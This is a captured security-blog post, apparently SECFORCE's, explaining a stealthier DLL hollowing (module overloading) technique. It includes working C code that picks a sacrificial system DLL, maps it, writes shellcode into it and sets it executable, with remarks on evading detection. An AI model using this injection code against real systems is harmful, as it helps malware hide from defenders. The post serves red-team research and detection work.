@@ -1,0 +1,806 @@
+# https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/
+
+<!DOCTYPE html><html lang="en">
+ 
+<body>
+    
+    <!-- End Google Tag Manager (noscript) -->
+
+    
+    
+    
+    <!-- Page transition curtain -->
+    <div class="transition-curtain" id="transition-curtain" style="top: 0px; left: 0px; height: 100vh; width: 100vw;"></div>
+
+    
+
+<link rel="stylesheet" href="https://www.secforce.com/assets/styles/code.css">
+
+<div id="pageContent" class="main-wrapper page-post">
+	<section class="section-post-meta">
+		<div class="section-inner container align-center">
+			<h1 class="post-title">DLL Hollowing</h1>
+			
+			<div class="post-image">
+				<img alt="DLL-Hollowing.png" src="https://www.secforce.com/media/images/DLL-Hollowing.width-1000.png" width="1000">
+			</div>
+		</div>
+	</section>
+
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h2 data-block-key="xthcw">DLL Hollowing</h2><p data-block-key="2l9bb">The idea of using the variation of the DLL Hollowing technique, which will be discussed in this blog post, came while implementing the memory allocation scheme used in PEzoNG during the research on Windows evasion. PEzoNG is a packer developed by Giorgio Bernardinetti (<a href="https://twitter.com/gbyolo_it">gbyolo</a>) from CNIT and myself, Dimitri Di Cristofaro (<a href="https://twitter.com/d_glenx">GlenX</a>), which is not public at the time of writing. Check out <a href="https://www.youtube.com/watch?v=RZAWSCesiSs">our talk</a> at the Red Team Village H@ctivitycon 2021 for an overview of the tool.</p><p data-block-key="9m5tk">During our research of different ways to allocate memory - in particular, we wanted to hide our payload inside a legitimate DLL - we explored the <a href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing">Phantom DLL Hollowing</a> technique but decided that it didn’t fit our needs as it required <i>write</i> permissions on the DLL we wanted to overwrite (the technique is really interesting though!). This is not a huge limitation, as suggested by the author, we could just copy the DLL somewhere else. However, when we read about <i>Module Overloading</i> (<a href="https://twitter.com/TheRealWover/status/1193284444687392768?s=20">here</a> and <a href="https://github.com/hasherezade/module_overloading">here</a>), we decided that this was the way to go.</p><p data-block-key="2rhdd">This variant of memory allocation removes the prerequisite of having <i>write</i> access to the target DLL (in contrast to <i>Phantom DLL Hollowing</i>) and is stealthier than “classic” Dll Hollowing (which uses the LoadlLibrary API) as we keep the benefits of storing the payload in a legitimate DLL. It uses <code>NTDLL.DLL!NtCreateSection</code> and <code>NTDLL.DLL!NtMapViewOfSection</code> to allocate memory and uses the handle of the mapped memory to overwrite the DLL with the malicious payload. It is then necessary to change the memory protection to <i>RX</i> using <code>NtProtectVirtualMemory</code>.</p><p data-block-key="enmoi">The Module Overloading technique allows us to open the sacrificial (legitimate) DLL file with <code>READONLY</code> access, maintaining the Image flag for mapped memory, as opposed to Private that is obtained when <code>NtAllocateVirtualMemory</code> is used. To summarise, the following steps are used to allocate memory for the injected payload:</p><ul><li data-block-key="7r7b9">Find a sacrificial DLL which is not loaded into the process yet</li><li data-block-key="bg244">Open the sacrificial DLL with the <code>READONLY</code> flag using <code>CreateFile</code> API (or <code>NtCreateFile</code> system call).</li><li data-block-key="3lgbd">Call <code>NtCreateSection</code> with the <code>SEC_IMAGE</code> and <code>PAGE_READONLY</code> memory protection flags using the handle of the file opened in the previous step</li><li data-block-key="7q6f1">Call <code>NtMapViewOfSection</code> passing the handle to the section created in the previous step.</li><li data-block-key="62do4">Return the pointer to the mapped section</li></ul><p data-block-key="6lc26">The following code can be used to find the sacrificial DLL. Please note that, in the code excerpt, we call <code>NtMapViewOfSection</code> passing the <code>PAGE_READWRITE</code> flag in the Protect parameter but we can use any protection flag (even <code>PAGE_READONLY</code>) since we called <code>NtCreateSection</code> with <code>SEC_IMAGE</code>.</p><p data-block-key="8d1cc"><code>"The SEC_IMAGE attribute must be combined with a page protection value such as PAGE_READONLY. However, this page protection value has no effect on views of the executable image file. Page protection for views of an executable image file is determined by the executable file itself." (</code><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga"><code>source</code></a><code>)</code></p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span><span class="cm">/*</span>
+<span class="cm">	Search for a DLL not loaded in the current process that is large enough to store the payload.</span>
+
+<span class="cm">	- FilePath will contain the path of the DLL if the function returns TRUE.</span>
+<span class="cm">	- size_FilePath is the size of FilePath</span>
+<span class="cm">	- size_of_shellcode is the size needed to store the payload</span>
+<span class="cm">	NB: FilePath *MUST* be MAX_PATH*2 size - This is necessary because we don't know how long the path for the DLL that we find will be</span>
+
+<span class="cm">	Return: TRUE if a DLL with an appropriate size is found, FALSE otherwise</span>
+<span class="cm">	NB: The return value of this function *MUST* be checked before using FilePath in other calls as we don't mind about what is inside the variable if we fail</span>
+<span class="cm">*/</span>
+<span class="n">BOOL</span><span class="w"> </span><span class="nf">findSacrificialDll</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="kt">wchar_t</span><span class="o">*</span><span class="w"> </span><span class="n">FilePath</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size_FilePath</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size_of_shellcode</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">size_FilePath</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MAX_PATH</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span>
+<span class="w">	</span><span class="p">{</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="kt">wchar_t</span><span class="w">				</span><span class="n">SearchFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">];</span>
+<span class="w">	</span><span class="n">HANDLE</span><span class="w">				</span><span class="n">hFind</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">	</span><span class="n">BOOL</span><span class="w">				</span><span class="n">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">	</span><span class="n">WIN32_FIND_DATAW</span><span class="w">	</span><span class="n">Wfd</span><span class="p">;</span>
+<span class="w">	</span><span class="kt">size_t</span><span class="w">				</span><span class="n">size_dest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">GetSystemDirectoryW</span><span class="p">(</span><span class="n">SearchFilePath</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_PATH</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">		</span><span class="n">printf</span><span class="p">(</span><span class="s">"GetSystemDirectoryW: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"Finding a sacrificial Dll</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">	</span><span class="n">wcscat_s</span><span class="p">(</span><span class="n">SearchFilePath</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_PATH</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"</span><span class="se">\\</span><span class="s">*.dll"</span><span class="p">);</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">hFind</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FindFirstFileW</span><span class="p">(</span><span class="n">SearchFilePath</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Wfd</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">		</span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">			</span><span class="c1">// if the DLL isn't already loaded</span>
+<span class="w">			</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isDllLoaded</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">Wfd</span><span class="p">.</span><span class="n">cFileName</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">				</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">GetSystemDirectoryW</span><span class="p">(</span><span class="n">FilePath</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_PATH</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">					</span><span class="n">printf</span><span class="p">(</span><span class="s">"GetSystemDirectoryW: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+<span class="w">					</span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">				</span><span class="p">}</span>
+
+<span class="w">				</span><span class="c1">// Write File Path</span>
+<span class="w">				</span><span class="n">wcscat_s</span><span class="p">(</span><span class="n">FilePath</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_PATH</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">);</span>
+<span class="w">				</span><span class="n">wcscat_s</span><span class="p">(</span><span class="n">FilePath</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_PATH</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">Wfd</span><span class="p">.</span><span class="n">cFileName</span><span class="p">);</span>
+
+<span class="w">				</span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"Checking %ls</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">FilePath</span><span class="p">);</span>
+
+<span class="w">				</span><span class="n">size_dest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getSizeOfImage</span><span class="p">(</span><span class="n">FilePath</span><span class="p">);</span>
+
+<span class="w">				</span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"DLL is 0x%x bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">size_dest</span><span class="p">);</span>
+
+<span class="w">				</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">size_of_shellcode</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">size_dest</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">					</span><span class="n">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+<span class="w">					</span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"DLL Found! %ls </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">FilePath</span><span class="p">);</span>
+<span class="w">				</span><span class="p">}</span>
+<span class="w">			</span><span class="p">}</span>
+<span class="w">		</span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">found</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">FindNextFileW</span><span class="p">(</span><span class="n">hFind</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Wfd</span><span class="p">));</span>
+<span class="w">		</span><span class="c1">// close the handle </span>
+<span class="w">		</span><span class="n">FindClose</span><span class="p">(</span><span class="n">hFind</span><span class="p">);</span>
+<span class="w">	</span><span class="p">}</span>
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="n">found</span><span class="p">;</span>
+<span class="p">}</span><span class="w"> </span>
+<span class="n">Where</span><span class="w"> </span><span class="n">isDllLoaded</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">defined</span><span class="w"> </span><span class="n">as</span>
+<span class="cm">/*</span>
+<span class="cm">	Return TRUE if the DLL is loaded. FALSE otherwise</span>
+<span class="cm">*/</span>
+<span class="n">BOOL</span><span class="w"> </span><span class="n">isDllLoaded</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="kt">wchar_t</span><span class="o">*</span><span class="w"> </span><span class="n">filePath</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">	</span><span class="c1">// Local</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hProcess</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">	</span><span class="c1">// remote – more on this later on</span>
+<span class="w">	</span><span class="k">else</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="p">.</span>
+<span class="p">}</span>
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="xthcw">After the sacrificial DLL has been found, we can allocate memory using the following code:</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span><span class="n">NTSTATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0</span><span class="p">;</span>
+<span class="n">DWORD</span><span class="w">  </span><span class="n">protect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0</span><span class="p">;</span>
+<span class="n">HANDLE</span><span class="w"> </span><span class="n">hFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">hSection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="n">BYTE</span><span class="o">*</span><span class="w"> </span><span class="n">mapped</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="c1">// We need two variables for shellcode size because NtProtectVirtualMemory overwrites the value with the size of the actual affected memory</span>
+<span class="c1">// which is always a multiple of page size</span>
+<span class="c1">// but we want to write size bytes of shellcode and not the whole page :)</span>
+<span class="n">SIZE_T</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>
+<span class="n">SIZE_T</span><span class="w"> </span><span class="n">bytesWritten</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">allocation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="n">DWORD</span><span class="w"> </span><span class="n">oldProtect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="n">HANDLE</span><span class="w"> </span><span class="n">hThread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="c1">// Open File </span>
+<span class="c1">// NB: we could also use the syscall NtCreateFile for better OPSEC</span>
+<span class="n">hFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileW</span><span class="p">(</span><span class="n">dll_name</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="c1">// Create Section - NtCreateSection</span>
+<span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtCreateSection</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hSection</span><span class="p">,</span><span class="w"> </span><span class="n">SECTION_ALL_ACCESS</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READONLY</span><span class="p">,</span><span class="w"> </span><span class="n">SEC_IMAGE</span><span class="p">,</span><span class="w"> </span><span class="n">hFile</span><span class="p">);</span>
+
+<span class="c1">// Close file</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">status</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"NtCreateSection: 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
+<span class="w">	</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Section created - hSection = 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">hSection</span><span class="p">);</span>
+
+<span class="c1">// Map Section - NtMapViewOfSection</span>
+<span class="n">protect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">;</span>
+<span class="n">mapped</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">map_dll_image</span><span class="p">(</span><span class="n">hSection</span><span class="p">,</span><span class="w"> </span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">protect</span><span class="p">);</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mapped</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">	</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSection</span><span class="p">);</span>
+<span class="w">	</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">	</span><span class="c1">// this is not a fatal error</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"hFile: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+<span class="p">}</span>
+
+<span class="n">where</span><span class="w"> </span><span class="n">map_dll_image</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">just</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">NtMapViewOfSection</span><span class="p">,</span><span class="w"> </span><span class="n">defined</span><span class="w"> </span><span class="n">as</span>
+
+<span class="n">PVOID</span><span class="w"> </span><span class="n">map_dll_image</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hSection</span><span class="p">,</span><span class="w"> </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">DWORD</span><span class="w"> </span><span class="n">protect</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">	</span><span class="n">NTSTATUS</span><span class="w">			</span><span class="n">status</span><span class="p">;</span>
+<span class="w">	</span><span class="n">PVOID</span><span class="w">				</span><span class="n">sectionBaseAddress</span><span class="p">;</span>
+<span class="w">	</span><span class="n">SIZE_T</span><span class="w">				</span><span class="n">viewSize</span><span class="p">;</span>
+<span class="w">	</span><span class="n">SECTION_INHERIT</span><span class="w">		</span><span class="n">inheritDisposition</span><span class="p">;</span>
+
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hProcess</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+
+<span class="w">	</span><span class="c1">// NtMapViewOfSection always fail when you specify a desired base address</span>
+<span class="w">	</span><span class="n">sectionBaseAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">	</span><span class="n">viewSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">	</span><span class="n">inheritDisposition</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ViewShare</span><span class="p">;</span>
+
+<span class="w">	</span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtMapViewOfSection</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">hSection</span><span class="p">,</span>
+<span class="w">		</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">hProcess</span><span class="p">,</span>
+<span class="w">		</span><span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sectionBaseAddress</span><span class="p">,</span>
+<span class="w">		</span><span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span>
+<span class="w">		</span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span>
+<span class="w">		</span><span class="p">(</span><span class="n">PLARGE_INTEGER</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span>
+<span class="w">		</span><span class="o">&amp;</span><span class="n">viewSize</span><span class="p">,</span>
+<span class="w">		</span><span class="n">inheritDisposition</span><span class="p">,</span>
+<span class="w">		</span><span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">PtrToUlong</span><span class="p">(</span><span class="nb">NULL</span><span class="p">),</span>
+<span class="w">		</span><span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">protect</span><span class="p">);</span>
+
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">status</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">		</span><span class="n">printf</span><span class="p">(</span><span class="s">"NtMapViewOfSection: 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="n">sectionBaseAddress</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="xthcw">After allocating memory, we could inject our payload with the following steps:</p><ul><li data-block-key="ems6a">Set to RW the area we want to overwrite with <code>NtProtectVirtualMemory</code></li><li data-block-key="8m9cl">Overwrite the DLL with the payload</li><li data-block-key="40tk3">Set proper permissions with <code>NtProtectVirtualMemory</code><br></li></ul><p data-block-key="e03rk">The following code can be used to write the payload and execute it:</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span><span class="c1">// Change Permissions on memory to RW</span>
+<span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtProtectVirtualMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span>
+<span class="w">	</span><span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">mapped</span><span class="p">,</span>
+<span class="w">	</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span>
+<span class="w">	</span><span class="n">PAGE_READWRITE</span><span class="p">,</span>
+<span class="w">	</span><span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">status</span><span class="p">))</span>
+<span class="p">{</span>
+<span class="w">	</span><span class="c1">// ERROR</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"ERROR: NtProtectVirtualMemory (RW) = 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"%d bytes of memory starting from 0x%p set RW</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">mapped</span><span class="p">);</span>
+
+<span class="c1">// Write memory</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Writing %d bytes of shellcode</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span>
+<span class="c1">// if we are injecting into a local process, we can use memcpy</span>
+<span class="c1">// memcpy(mapped, shellcode, size)</span>
+<span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtWriteVirtualMemory</span><span class="p">(</span>
+<span class="w">	</span><span class="n">hProcess</span><span class="p">,</span>
+<span class="w">	</span><span class="n">mapped</span><span class="p">,</span>
+<span class="w">	</span><span class="n">shellcode</span><span class="p">,</span>
+<span class="w">	</span><span class="n">size</span><span class="p">,</span>
+<span class="w">	</span><span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">);</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"%d bytes written!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">bytesWritten</span><span class="p">);</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">status</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">bytesWritten</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">	</span><span class="c1">// ERROR</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"ERROR: NtWriteVirtualMemory = 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* change permissions to allow payload to run */</span>
+
+<span class="c1">// Change protection to RX</span>
+<span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtProtectVirtualMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span>
+<span class="w">	</span><span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">mapped</span><span class="p">,</span>
+<span class="w">	</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span>
+<span class="w">	</span><span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span>
+<span class="w">	</span><span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">status</span><span class="p">))</span>
+<span class="p">{</span>
+<span class="w">	</span><span class="c1">// ERROR</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"ERROR: NtProtectVirtualMemory (RX) = 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
